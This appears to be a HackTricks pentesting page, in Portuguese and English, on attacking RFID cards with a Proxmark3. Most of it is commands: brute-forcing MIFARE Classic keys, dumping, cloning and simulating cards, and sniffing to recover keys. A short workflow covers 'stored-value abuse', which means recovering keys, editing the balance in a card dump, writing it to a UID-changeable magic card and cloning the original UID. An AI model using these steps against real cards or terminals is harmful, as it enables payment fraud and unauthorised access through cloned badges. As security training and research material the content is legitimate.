# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Atacando sistemas RFID com Proxmark3

A primeira coisa que você precisa fazer é ter um [**Proxmark3**](https://proxmark.com) e [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Atacando MIFARE Classic 1KB

Possui **16 setores**, cada um com **4 blocos** e cada bloco contém **16B**. O UID está no setor 0 bloco 0 (e não pode ser alterado).\
Para acessar cada setor você precisa de **2 chaves** (**A** e **B**) que são armazenadas no **bloco 3 de cada setor** (trailer do setor). O trailer do setor também armazena os **bits de acesso** que definem as permissões de **leitura e escrita** em **cada bloco** usando as 2 chaves.\
Duas chaves são úteis para dar permissão de leitura se você souber a primeira e permissão de escrita se souber a segunda (por exemplo).

Vários ataques podem ser realizados
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
O Proxmark3 permite realizar outras ações como **eavesdropping** de uma **Tag to Reader communication** para tentar encontrar dados sensíveis. Neste cartão você poderia apenas sniff the communication e calcular a chave usada porque as **cryptographic operations used are weak** e, conhecendo o plain and cipher text, você pode calculá-la (`mfkey64` tool).

#### MiFare Classic quick workflow for stored-value abuse

Quando terminais armazenam saldos em Classic cards, um fluxo típico ponta a ponta é:
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Notas

- `hf mf autopwn` orquestra ataques estilo nested/darkside/HardNested, recupera chaves e cria dumps na pasta client dumps.
- A escrita do block 0/UID funciona apenas em cartões magic gen1a/gen2. Cartões Classic normais têm UID somente leitura.
- Muitas implantações usam Classic "value blocks" ou checksums simples. Garanta que todos os campos duplicados/complementados e checksums estejam consistentes após a edição.

See a higher-level methodology and mitigations in:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Comandos Raw

IoT systems sometimes use **nonbranded or noncommercial tags**. In this case, you can use Proxmark3 to send custom **raw commands to the tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Com essas informações você pode tentar buscar informações sobre o cartão e sobre a forma de comunicar-se com ele. O Proxmark3 permite enviar comandos raw como: `hf 14a raw -p -b 7 26`

### Scripts

O software Proxmark3 vem com uma lista pré-carregada de **scripts de automação** que você pode usar para realizar tarefas simples. Para recuperar a lista completa, use o comando `script list`. Em seguida, use o comando `script run`, seguido pelo nome do script:
```
proxmark3> script run mfkeys
```
Você pode criar um script para fuzz tag readers — copiando os dados de um cartão válido, basta escrever um script em Lua que randomize um ou mais bytes e verifique se o reader trava em alguma iteração.

## Referências

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
